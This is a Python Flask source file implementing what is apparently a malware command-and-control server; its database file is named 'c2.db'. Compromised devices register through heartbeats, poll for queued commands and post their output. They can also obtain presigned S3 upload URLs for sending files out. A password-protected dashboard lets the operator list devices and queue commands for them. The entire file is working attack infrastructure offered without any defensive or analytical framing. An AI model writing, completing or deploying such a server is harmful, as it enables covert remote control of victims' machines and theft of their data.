import os
import sqlite3
import boto3
from botocore.config import Config
from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime

app = Flask(__name__)
DB_PATH = "c2.db"
PASSWORD = os.environ.get("DASH_PASSWORD", "CHANGE_ME_NOW")

S3_ENDPOINT = os.environ.get("S3_ENDPOINT")
S3_ACCESS = os.environ.get("S3_ACCESS")
S3_SECRET = os.environ.get("S3_SECRET")
S3_BUCKET = os.environ.get("S3_BUCKET")

s3 = boto3.client(
    's3',
    endpoint_url=S3_ENDPOINT,
    aws_access_key_id=S3_ACCESS,
    aws_secret_access_key=S3_SECRET,
    config=Config(signature_version='s3v4')
)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices (id TEXT PRIMARY KEY, model TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS output (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, text TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

init_db()

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    now = datetime.utcnow().isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO devices VALUES (?, ?, ?)", (data['device_id'], data['model'], now))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

@app.route('/api/get_command')
def get_command():
    dev_id = request.args.get('device_id')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE device_id=? AND status='pending' LIMIT 1", (dev_id,))
    row = c.fetchone()
    if row:
        c.execute("UPDATE commands SET status='sent' WHERE id=?", (row[0],))
        conn.commit()
        conn.close()
        return jsonify({"command": row[1]})
    conn.close()
    return jsonify({"command": "none"})

@app.route('/api/post_output', methods=['POST'])
def post_output():
    data = request.json
    now = datetime.utcnow().isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO output (device_id, text, timestamp) VALUES (?, ?, ?)", (data['device_id'], data['text'], now))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

@app.route('/api/get_upload_url')
def get_upload_url():
    dev_id = request.args.get('device_id')
    filename = request.args.get('filename')
    key = f"{dev_id}/{filename}"
    url = s3.generate_presigned_url(ClientMethod='put_object', Params={'Bucket': S3_BUCKET, 'Key': key}, ExpiresIn=3600)
    return jsonify({"url": url})

@app.route('/api/dashboard', methods=['GET', 'POST'])
def dashboard():
    if request.headers.get('Authorization') != PASSWORD:
        return jsonify({"error": "unauthorized"}), 401
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    if request.method == 'GET':
        c.execute("SELECT * FROM devices")
        devices = [{"id": r[0], "model": r[1], "last_seen": r[2]} for r in c.fetchall()]
        c.execute("SELECT * FROM output ORDER BY id DESC LIMIT 50")
        outputs = [{"dev": r[1], "text": r[2], "time": r[3]} for r in c.fetchall()]
        conn.close()
        return jsonify({"devices": devices, "outputs": outputs})
    else:
        data = request.json
        c.execute("INSERT INTO commands (device_id, command, status) VALUES (?, ?, 'pending')", (data['device_id'], data['command']))
        conn.commit()
        conn.close()
        return jsonify({"status": "queued"})

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
